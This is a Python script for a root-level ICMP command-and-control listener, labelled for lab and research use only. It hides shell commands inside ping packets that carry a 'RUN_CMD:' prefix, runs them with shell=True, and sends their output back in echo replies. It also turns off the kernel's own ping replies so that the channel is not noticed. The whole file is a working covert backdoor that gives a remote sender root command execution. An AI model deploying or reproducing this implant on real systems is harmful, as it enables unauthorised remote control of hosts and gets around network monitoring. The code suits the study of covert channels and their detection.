#!/usr/bin/env python3
"""
ICMP Command & Control Listener – LAB / RESEARCH USE ONLY
Listens for ICMP echo requests containing commands after SIGNATURE.
Executes them in background thread and sends output back in echo reply when done.

WARNING: This executes arbitrary commands as root. Extremely dangerous.
Use ONLY in isolated virtual lab environment you fully control.
"""

import socket
import struct
import subprocess
import sys
import os
import time
import threading
import atexit

# ────────────────────────────────────────────────
SIGNATURE         = b"RUN_CMD:"           # must match sender
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY   = 0
MAX_RECV          = 9216                  # keep under typical MTU troubles
REPLY_TRUNCATE    = 3800                  # many networks drop > ~4 kB ICMP
DEFAULT_TIMEOUT   = 30                    # command timeout in seconds
# ────────────────────────────────────────────────

def icmp_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff


def build_icmp_reply(ident: int, seq: int, payload: bytes) -> bytes:
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, ident, seq)
    full = header + payload
    chksum = icmp_checksum(full)
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, chksum, ident, seq)
    return header + payload


def run_command_in_thread(sock, src_ip, ident, seq, command):
    def target():
        output_str = safe_run_command(command)

        # Safety: truncate very large replies
        if len(output_str) > REPLY_TRUNCATE:
            output_str = output_str[:REPLY_TRUNCATE - 60] + "\n[output truncated - too large]"

        # Encode only when sending
        output_bytes = output_str.encode("utf-8", errors="replace")

        reply_packet = build_icmp_reply(ident, seq, output_bytes)

        try:
            sock.sendto(reply_packet, (src_ip, 0))
            print(f"[sent reply] {len(output_bytes)} bytes → {src_ip} (from thread)")
        except Exception as e:
            print(f"[send failed → {src_ip}] {e}")

    thread = threading.Thread(target=target, daemon=True)
    thread.start()


def safe_run_command(cmd: str) -> str:
    if not cmd.strip():
        return "[empty command received]\n"

    print(f"→ executing in background: {cmd}")

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=DEFAULT_TIMEOUT,
            text=True,                          # returns str, not bytes
            env=os.environ.copy()
        )
        output = result.stdout
        if result.returncode != 0:
            output += f"\n[!!] exited with code {result.returncode}"
        return output or "[command ran - no output]"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT after {DEFAULT_TIMEOUT}s]"
    except Exception as e:
        return f"[execution failed] {type(e).__name__}: {e}"


# Global variable for original ICMP echo ignore setting
original_icmp_echo_ignore = None

def restore_icmp_echo_ignore():
    if original_icmp_echo_ignore is not None:
        try:
            with open('/proc/sys/net/ipv4/icmp_echo_ignore_all', 'w') as f:
                f.write(original_icmp_echo_ignore)
            print("[+] Restored original ICMP echo ignore setting")
        except Exception as e:
            print(f"[!] Failed to restore ICMP setting: {e}")


def main():
    global original_icmp_echo_ignore

    if os.geteuid() != 0:
        print("[!] This script must run as root", file=sys.stderr)
        sys.exit(1)

    # Read and set icmp_echo_ignore_all to 1 to prevent kernel replies
    try:
        with open('/proc/sys/net/ipv4/icmp_echo_ignore_all', 'r') as f:
            original_icmp_echo_ignore = f.read().strip()
        with open('/proc/sys/net/ipv4/icmp_echo_ignore_all', 'w') as f:
            f.write('1')
        print("[+] Disabled kernel ICMP echo replies (set icmp_echo_ignore_all=1)")
        atexit.register(restore_icmp_echo_ignore)
    except Exception as e:
        print(f"[!] Warning: Failed to disable kernel ICMP replies: {e}")
        print("[!] The script may not work properly due to duplicate replies.")
        print("[!] Run manually: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4*1024*1024)
    except Exception as e:
        print(f"[!] Failed to create raw ICMP socket: {e}", file=sys.stderr)
        sys.exit(1)

    print("[+] ICMP command listener started")
    print(f"[+] Waiting for packets with prefix: {SIGNATURE!r}")
    print("[+] Commands run in background threads")
    print("[+] Press Ctrl+C to stop\n")

    while True:
        try:
            packet, (src_ip, _) = sock.recvfrom(MAX_RECV)
        except KeyboardInterrupt:
            print("\n[!] Shutting down.")
            restore_icmp_echo_ignore()
            break
        except Exception as e:
            print(f"[recv error] {e}")
            time.sleep(0.3)
            continue

        if len(packet) < 28:
            continue

        ip_header_len = (packet[0] & 0x0F) * 4
        if len(packet) < ip_header_len + 8:
            continue

        icmp_header = packet[ip_header_len : ip_header_len + 8]
        icmp_type, _, _, ident, seq = struct.unpack("!BBHHH", icmp_header)

        if icmp_type != ICMP_ECHO_REQUEST:
            continue

        payload = packet[ip_header_len + 8:]
        if not payload.startswith(SIGNATURE):
            # For non-signed packets, do NOT reply (kernel is disabled)
            continue

        try:
            command = payload[len(SIGNATURE):].decode("utf-8", errors="replace").strip()
        except:
            command = "<decode failed>"

        if not command:
            continue

        print(f"[!] {src_ip} sent command: {command!r}")

        # Spawn background thread to run command and send reply when done
        run_command_in_thread(sock, src_ip, ident, seq, command)


if __name__ == "__main__":
    main()
